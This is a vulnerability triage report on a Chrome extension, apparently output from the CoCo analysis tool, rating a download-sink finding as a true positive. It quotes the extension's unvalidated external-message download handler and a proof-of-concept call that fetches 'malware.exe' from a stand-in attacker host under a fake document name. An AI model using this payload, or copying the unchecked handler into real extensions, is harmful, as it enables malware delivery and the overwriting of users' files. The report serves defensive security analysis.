# CoCo Analysis: komegelldppbjndifhabfpjpddjaocfa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both to chrome_downloads_download_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/komegelldppbjndifhabfpjpddjaocfa/opgen_generated_files/bg.js
Line 978: url: request.url
Line 979: filename: request.filename

**Code:**

```javascript
// Background script - External message handler
chrome.runtime.onMessageExternal.addListener(messageReceived);

function messageReceived(request, sender, sendResponse) {
  try {
    if (request.command == 'download') {
      chrome.downloads.download({
        url: request.url,               // ← attacker-controlled
        filename: request.filename,     // ← attacker-controlled
        conflictAction: "overwrite",
      }, function (downloadId) {
        if (downloadId === undefined) {
          sendResponse({
            success: false,
            data: { errormsg: chrome.runtime.lastError.message }
          });
          return;
        }
        updates[downloadId] = {
          id: downloadId,
          urlOriginal: request.url,
          filenameOriginal: request.filename
        };
        sendResponse({
          success: true,
          data: { id: downloadId }
        });
      });
      return true;
    }
  } catch(e) {
    // error handling
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on https://balcaojus.trf2.jus.br/balcaojus/* or localhost
chrome.runtime.sendMessage(
  'komegelldppbjndifhabfpjpddjaocfa',
  {
    command: 'download',
    url: 'https://attacker.com/malware.exe',
    filename: 'document.exe'
  },
  function(response) {
    console.log('Malicious download initiated:', response);
  }
);
```

**Impact:** Attacker can trigger arbitrary file downloads with attacker-controlled URLs and filenames. This enables delivery of malware disguised as legitimate documents, potentially compromising the user's system. The "overwrite" conflict action makes this particularly dangerous as it can replace existing files.
